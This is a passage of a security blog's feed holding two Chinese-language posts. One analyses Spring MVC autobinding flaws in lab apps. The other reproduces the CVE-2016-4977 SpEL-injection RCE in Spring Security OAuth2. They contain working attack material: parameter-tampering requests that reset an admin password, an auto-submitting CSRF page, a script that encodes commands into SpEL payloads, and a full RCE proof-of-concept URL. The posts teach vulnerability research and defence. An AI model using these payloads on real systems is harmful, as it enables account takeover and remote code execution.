class="line">logger.info(<span class="string">"Welcome reset ! "</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"reset"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/reset"</span>, method = RequestMethod.POST)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resetHandler</span><span class="params">(@RequestParam String username, Model model)</span> </span>&#123;</span><br><span class="line">logger.info(<span class="string">"Checking username "</span> + username);</span><br><span class="line">User user = userService.findByName(username);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (user == <span class="keyword">null</span>) &#123;</span><br><span class="line">logger.info(<span class="string">"there is no user with name "</span> + username);</span><br><span class="line">model.addAttribute(<span class="string">"error"</span>, <span class="string">"Username is not found"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"reset"</span>;</span><br><span class="line">&#125;</span><br><span class="line">model.addAttribute(<span class="string">"user"</span>, user);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="string">"redirect:resetQuestion"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/resetQuestion"</span>, method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resetViewQuestionHandler</span><span class="params">(@ModelAttribute User user)</span> </span>&#123;</span><br><span class="line">logger.info(<span class="string">"Welcome resetQuestion ! "</span> + user);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"resetQuestion"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/resetQuestion"</span>, method = RequestMethod.POST)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resetQuestionHandler</span><span class="params">(@RequestParam String answerReset, SessionStatus status,</span></span></span><br><span class="line"><span class="function"><span class="params">User user, Model model)</span> </span>&#123;</span><br><span class="line">logger.info(<span class="string">"Checking resetQuestion ! "</span> + answerReset + <span class="string">" for "</span> + user);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!user.getAnswer().equals(answerReset)) &#123;</span><br><span class="line">logger.info(<span class="string">"Answer in db "</span> + user.getAnswer() + <span class="string">" Answer "</span> + answerReset);</span><br><span class="line">model.addAttribute(<span class="string">"error"</span>, <span class="string">"Incorrect answer"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"resetQuestion"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status.setComplete();</span><br><span class="line">String newPassword = GeneratePassword.generatePassowrd(<span class="number">10</span>);</span><br><span class="line">user.setPassword(newPassword);</span><br><span class="line">userService.updateUser(user);</span><br><span class="line"></span><br><span class="line">model.addAttribute(<span class="string">"message"</span>, <span class="string">"Your new password is "</span> + newPassword);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单理下：</p><ol><li>ResetPasswordController类是被<code>@SessionAttributes(&quot;user&quot;)</code>注解修饰的，即会自动把user对象放到session中。</li><li>这里/reset接口就是直接对应的resetHandler()函数。在POST方式的resetHandler()函数中，先判断当前用户名是否存在，若存在则将user添加到model中，再重定向到resetQuestion中作进一步处理；<strong>可以看到，两个resetHandler()函数都没有直接从参数或者从session中获取user对象，因此resetHandler()函数不存在自动绑定漏洞</strong>。</li><li>这里/resetQuestion接口就是直接对应的resetQuestionHandler()函数。在GET方式的resetQuestionHandler()函数中，其唯一的user参数使用了·@ModelAttribute·注解修饰，即会将传递过来的user参数按名称注入到指定对象中，而这里实际上是从session中获取user对象；在POST方式的函数中，并没有使用<code>@ModelAttribute</code>注解修饰参数，但是Spring MVC会自动从session中提取user，并且使用相同的逻辑，用http请求参数去自动绑定对应的用户参数，该函数的代码逻辑，先获取user对象的answer属性值来跟我们从外部表单输入的answerReset值进行比较，若相等则往下成功重置用户密码，否则报错；<strong>也就是说，这两个resetQuestionHandler()函数都用到了session中的user对象，都存在自动绑定漏洞</strong>。</li></ol><p>由前面分析可知，resetQuestionHandler()函数就是自动绑定漏洞的逻辑漏洞代码所在，我们只需要对这个接口的以GET或POST方式传递User类对象的参数即可修改自动绑定的user对象的属性值，实现自动绑定漏洞的利用。</p><h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>我们先点击忘记密码，在这里输入admin用户名检测是否存在该用户：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/9.png" alt=""></p><p>若存在则直接跳转到/resetQuestion界面，这里是个密保找回的表单：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/5.png" alt=""></p><p>现在已知是存在admin用户的，下面就对admin用户进行自动绑定漏洞的攻击利用。</p><h5 id="攻击GET方式的-resetQuestion接口"><a href="#攻击GET方式的-resetQuestion接口" class="headerlink" title="攻击GET方式的/resetQuestion接口"></a>攻击GET方式的/resetQuestion接口</h5><p>直接往/resetQuestion接口发送包含user对象属性的参数即可直接篡改user对象的属性值：</p><p><code>GET /justiceleague/resetQuestion?answer=mi1k7ea</code></p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/1.png" alt=""></p><p>在Tomcat后台是可以看到日志记录了将admin用户的answer属性篡改了：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/2.png" alt=""></p><p>当然，user对象的其他参数也是可以直接通过变量绑定漏洞直接修改的，比如直接修改admin用户的密码：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/3.png" alt=""></p><h5 id="攻击POST方式的-resetQuestion接口"><a href="#攻击POST方式的-resetQuestion接口" class="headerlink" title="攻击POST方式的/resetQuestion接口"></a>攻击POST方式的/resetQuestion接口</h5><p>提交POST表单的页面就是前面/resetQuestion的界面，我们知道该表单包含两个参数即question和answerReset。</p><p>我们这里在原报文的基础上，直接添加user对象的属性为参数来篡改user属性值：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/4.png" alt=""></p><p>可以看到，虽然我们不知道真正的密保答案即admin用户的answer属性值，因此输入错误的answerReset参数值后就会显示回答错误，但是我们却成功篡改了admin的password，其他属性也是一样的操作即可。</p><p>除了这种利用方式外，POST方式的resetQuestionHandler()函数中还存在逻辑漏洞，即找回密码过程中进行密保问题回答的处理过程存在自动绑定漏洞绕过的风险。现在，我们只需要在原本POST报文的基础上加上answer参数、使其值直接和answerReset参数的一致，由于自动绑定漏洞的存在，将导致后台程序在比较user对象的answer属性值和我们表单提交的answerReset参数值是否相等时直接绕过了，从而执行了后面的代码实现密码重置：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/6.png" alt=""></p><p>此时到Tomcat后台查看，admin用户的answer被篡改为test，password被成功重置了和页面返回的一样：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/7.png" alt=""></p><h3 id="Edik"><a href="#Edik" class="headerlink" title="Edik"></a>Edik</h3><p>将war包放置于Tomcat中跑起来后，看到Edik主要有主页、注册、登录等几个页面。</p><h4 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h4><p>打开源码Controller部分，发现只有HomeController和RegistrationController这两个Controller文件。而其中使用<code>@ModelAttribute</code>或<code>@SessionAttributes</code>注解的只有HomeController这个文件，也就是说，有且仅有HomeController中会存在自动绑定漏洞。</p><p>我们看到HomeController的源码，这里只看有相关注解的部分即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@SessionAttributes</span>(<span class="string">"user"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HomeController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">@ModelAttribute</span>(<span class="string">"secondSecret"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getSecretCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">logger.debug(secondSecret);</span><br><span class="line"><span class="keyword">return</span> secondSecret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ModelAttribute</span>(<span class="string">"showSecret"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> Boolean <span class="title">getShowSectet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">logger.debug(<span class="string">"flag: "</span> + showSecret);</span><br><span class="line"><span class="keyword">return</span> showSecret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/home"</span>, method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">home</span><span class="params">(@ModelAttribute User user, Model model)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (showSecret)&#123;</span><br><span class="line">model.addAttribute(<span class="string">"firstSecret"</span>, firstSecret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析可知：</p><ol><li>HomeController使用<code>@SessionAttributes</code>注解修饰user对象，说明user对象会保存到session中；</li><li>使用<code>@ModelAttribute</code>注解的地方总共有3处，前两处是修饰方法，使方法在每次调用该控制器类的请求处理方法前被调用，主要用于日志记录；第三处是修饰的/home接口对应的home()函数的user参数，该接口是GET方式访问的；</li></ol><p>由此可知，HomeController的home()函数处是存在自动绑定漏洞的，因为通过注解和自动绑定机制我们可以直接通过参数的形式给home()函数的user对象传递恶意的属性值，而最后返回”home”会跳转到home界面进行展示。</p><h4 id="攻击利用-1"><a href="#攻击利用-1" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>这个站点本身没有更多的业务功能能让我们进行更深的利用。</p><h5 id="常规利用"><a href="#常规利用" class="headerlink" title="常规利用"></a>常规利用</h5><p>先注册个用户，然后登录，看到是跳转到了/home路径，这里页面展示了当前用户名和体重信息：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/10.png" alt=""></p><p>这里直接对/home接口以GET方式传递user对象的属性值，比如直接篡改用户名：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/11.png" alt=""></p><p>User类对象的另外两个属性password和weight也是同样能被修改的。</p><h5 id="自动绑定漏洞-XSS组合拳"><a href="#自动绑定漏洞-XSS组合拳" class="headerlink" title="自动绑定漏洞+XSS组合拳"></a>自动绑定漏洞+XSS组合拳</h5><p>这里很鸡肋：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/12.png" alt=""></p><h5 id="自动绑定漏洞-CSRF组合拳"><a href="#自动绑定漏洞-CSRF组合拳" class="headerlink" title="自动绑定漏洞+CSRF组合拳"></a>自动绑定漏洞+CSRF组合拳</h5><p>此外，自动绑定漏洞能和CSRF组合利用。</p><p>比如将修改password的自动绑定漏洞的链接和CSRF组合，通过诱使受害者访问即可成功修改受害者的密码，恶意csrf.html如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'http://192.168.10.1:8080/edik/home?password=666'</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> m = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'a'</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="undefined">  m.click();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-防御方法"><a href="#0x03-防御方法" class="headerlink" title="0x03 防御方法"></a>0x03 防御方法</h2><p>Spring MVC中可以使用@InitBinder注解，通过WebDataBinder的方法setAllowedFields、setDisallowedFields设置允许或不允许绑定的参数。</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://xz.aliyun.com/t/128" target="_blank" rel="noopener">浅析自动绑定漏洞</a></p><p><a href="https://xz.aliyun.com/t/1089" target="_blank" rel="noopener">Spring MVC Autobinding漏洞实例初窥</a></p><p><a href="https://www.anquanke.com/post/id/86278" target="_blank" rel="noopener">【技术分享】自动绑定漏洞和Spring MVC</a></p><p><a href="http://www.beesfun.com/2017/07/22/Spring-MVC-自动绑定漏洞/" target="_blank" rel="noopener">Spring MVC 自动绑定漏洞</a></p><p><a href="http://c.biancheng.net/view/4412.html" target="_blank" rel="noopener">Spring MVC中@ModelAttribute注解的使用</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/categories/Java/Spring/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>浅析Spring Security OAuth2之CVE-2016-4977</title>
    <link href="https://www.mi1k7ea.com/2020/02/09/%E6%B5%85%E6%9E%90Spring-Security-OAuth2%E4%B9%8BCVE-2016-4977/"/>
    <id>https://www.mi1k7ea.com/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/</id>
    <published>2020-02-09T14:22:22.000Z</published>
    <updated>2020-02-11T14:33:06.230Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Spring-Security-OAuth2"><a href="#0x01-Spring-Security-OAuth2" class="headerlink" title="0x01 Spring Security OAuth2"></a>0x01 Spring Security OAuth2</h2><h3 id="OAuth2"><a href="#OAuth2" class="headerlink" title="OAuth2"></a>OAuth2</h3><p>OAuth 2.0是用于授权的行业标准协议，核心思路是通过各类认证手段（具体什么手段OAuth 2.0不关心）认证用户身份，并颁发token，使得第三方应用可以使用该token在限定时间、限定范围内访问指定资源。OAuth 2.0致力于简化客户端开发人员的工作，同时为Web应用程序、桌面应用程序、移动电话和客厅设备提供特定的授权流程。</p><p>OAuth在”客户端”与”服务提供商”之间，设置了一个授权层（authorization layer）。”客户端”不能直接登录”服务提供商”，只能登录授权层，以此将用户与客户端区分开来。”客户端”登录授权层所用的令牌（token），与用户的密码不同。用户可以在登录的时候，指定授权层令牌的权限范围和有效期。</p><p>“客户端”登录授权层以后，”服务提供商”根据令牌的权限范围和有效期，向”客户端”开放用户储存的资料。</p><p>校验流程如图：</p><p><img src="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/4.png" alt=""></p><p>具体的讲解可参考：<a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener">《理解OAuth 2.0》</a></p><h3 id="Spring-Security-OAuth2"><a href="#Spring-Security-OAuth2" class="headerlink" title="Spring Security OAuth2"></a>Spring Security OAuth2</h3><p>Spring Security OAuth2是为Spring框架提供安全认证支持的一个模块，主要包含认证服务器和资源服务器这两大块的实现：</p><p>Spring Security OAuth2主要包含认证服务器和资源服务器这两大块的实现：</p><p><img src="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/5.png" alt=""></p><p>认证服务器主要包含了四种授权模式的实现和Token的生成与存储，我们也可以在认证服务器中自定义获取Token的方式；资源服务器主要是在Spring Security的过滤器链上加了OAuth2AuthenticationProcessingFilter过滤器，即使用OAuth2协议发放令牌认证的方式来保护我们的资源。</p><p>更多的参考官方文档即可。</p><h2 id="0x02-CVE-2016-4977"><a href="#0x02-CVE-2016-4977" class="headerlink" title="0x02 CVE-2016-4977"></a>0x02 CVE-2016-4977</h2><p>在Spring Security OAuth2的漏洞版本中，当用户使用<code>whitelabel views</code>来处理错误时，由于使用了SpEL表达式，攻击者在被授权的情况下可以通过构造恶意参数来RCE。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>2.0.0 to 2.0.9</li><li>1.0.0 to 1.0.5</li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>参考Vulhub：<a href="https://vulhub.org/#/environments/spring/CVE-2016-4977/" target="_blank" rel="noopener">https://vulhub.org/#/environments/spring/CVE-2016-4977/</a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问如下链接，使用admin:admin登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/oauth/authorize?response_type=$&#123;123*456&#125;&amp;client_id=acme&amp;redirect_uri=http://test</span><br><span class="line">或</span><br><span class="line">http://your-ip:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=$&#123;123*456&#125;</span><br></pre></td></tr></table></figure><p>在页面响应中会发现URL其中的参数的SpEL表达式会被解析，前面两个不同参数的注入在页面显示的报错信息也不一样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">error=&quot;unsupported_response_type&quot;, error_description=&quot;Unsupported response types: [56088]&quot;</span><br><span class="line">或</span><br><span class="line">error=&quot;invalid_grant&quot;, error_description=&quot;Invalid redirect: 56088 does not match one of the registered values: [http://localhost]&quot;</span><br></pre></td></tr></table></figure><p>此时已证明是存在SpEL表达式注入漏洞了。下面就进行漏洞利用。</p><p>注意，如果直接将对应的参数改为恶意的SpEL表达式来尝试执行某些命令的话会发现大多数不能成功，原因可参考：<a href="https://x.hacking8.com/post-294.html" target="_blank" rel="noopener">Java Runtime.getRuntime().exec() 的那些payloads</a></p><p>这里直接用P神的脚本，原理是会用ord()函数将命令中的每个字符转换为ASCII码，再通过字符串拼接以及调用toString()函数来实现命令还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">message = input(<span class="string">'Enter message to encode:'</span>)</span><br><span class="line"></span><br><span class="line">poc = <span class="string">'$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)'</span> % ord(message[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> message[<span class="number">1</span>:]:</span><br><span class="line">   poc += <span class="string">'.concat(T(java.lang.Character).toString(%s))'</span> % ord(ch) </span><br><span class="line"></span><br><span class="line">poc += <span class="string">')&#125;'</span></span><br><span class="line"></span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure><p>这里输入<code>touch /tmp/mi1k7ea</code>，生成如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(116).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(55)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)))&#125;</span><br></pre></td></tr></table></figure><p>最后将该内容替换到前面URL的会被SpEL解析的参数中构造出最终的PoC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/oauth/authorize?response_type=$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(116).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(55)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)))&#125;&amp;client_id=acme&amp;redirect_uri=http://test</span><br></pre></td></tr></table></figure><p>访问后页面显示如下：</p><p><img src="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/1.png" alt=""></p><p>到后台发现命令成功执行：</p><p><img src="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/2.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这里就不逐步调试分析了，直接看到关键的几个函数。</p><p>这里我们选择2.0.9版本的Spring Security Oauth的代码来分析。</p><p>由前面页面的显示知道，在Spring Security Oauth2中是使用了<code>whitelabel views</code>来处理错误的，而漏洞点正是出在这个错误的处理过程中。</p><p>接着我们找到对应的错误处理的源码路径：<a href="https://github.com/spring-projects/spring-security-oauth/blob/2.0.9.RELEASE/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/WhitelabelErrorEndpoint.java" target="_blank" rel="noopener">https://github.com/spring-projects/spring-security-oauth/blob/2.0.9.RELEASE/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/WhitelabelErrorEndpoint.java</a></p><p>看到WhitelabelErrorEndpoint类中，其含有一个handlerError()函数用于处理错误，这里会获取请求中的error，将其转换为OAuth2Exception类型，然后调用getSummary()函数来获取错误信息并进行HTML编码后赋值给errorSummary变量，将该变量put进model中，最后用SpelView()来渲染：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Controller for displaying the error page for the authorization server.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Dave Syer</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@FrameworkEndpoint</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WhitelabelErrorEndpoint</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ERROR = <span class="string">"&lt;html&gt;&lt;body&gt;&lt;h1&gt;OAuth Error&lt;/h1&gt;&lt;p&gt;$&#123;errorSummary&#125;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/oauth/error"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">handleError</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">Map&lt;String, Object&gt; model = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">Object error = request.getAttribute(<span class="string">"error"</span>);</span><br><span class="line"><span class="comment">// The error summary may contain malicious user input,</span></span><br><span class="line"><span class="comment">// it needs to be escaped to prevent XSS</span></span><br><span class="line">String errorSummary;</span><br><span class="line"><span class="keyword">if</span> (error <span class="keyword">instanceof</span> OAuth2Exception) &#123;</span><br><span class="line">OAuth2Exception oauthError = (OAuth2Exception) error;</span><br><span class="line">errorSummary = HtmlUtils.htmlEscape(oauthError.getSummary());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">errorSummary = <span class="string">"Unknown error"</span>;</span><br><span class="line">&#125;</span><br><span class="line">model.put(<span class="string">"errorSummary"</span>, errorSummary);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(<span class="keyword">new</span> SpelView(ERROR), model);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里errorSummary变量的值就是获取的我们输入的恶意参数的值即恶意SpEL表达式，此时errorSummary变量值为前面生成的PoC的内容即<code>${T(java.lang.Runtime).getRuntime().exec(...)}</code>。</p><p>接着我们看下SpelView类的源码，路径为：<a href="https://github.com/spring-projects/spring-security-oauth/blob/2.0.9.RELEASE/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/SpelView.java" target="_blank" rel="noopener">https://github.com/spring-projects/spring-security-oauth/blob/2.0.9.RELEASE/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/SpelView.java</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Simple String template renderer.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SpelView</span> <span class="keyword">implements</span> <span class="title">View</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">SpelView</span><span class="params">(String template)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.template = template;</span><br><span class="line"><span class="keyword">this</span>.context.addPropertyAccessor(<span class="keyword">new</span> MapAccessor());</span><br><span class="line"><span class="keyword">this</span>.helper = <span class="keyword">new</span> PropertyPlaceholderHelper(<span class="string">"$&#123;"</span>, <span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">this</span>.resolver = <span class="keyword">new</span> PlaceholderResolver() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resolvePlaceholder</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">Expression expression = parser.parseExpression(name);</span><br><span class="line">Object value = expression.getValue(context);</span><br><span class="line"><span class="keyword">return</span> value == <span class="keyword">null</span> ? <span class="keyword">null</span> : value.toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">render</span><span class="params">(Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">...</span><br><span class="line">String result = helper.replacePlaceholders(template, resolver);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 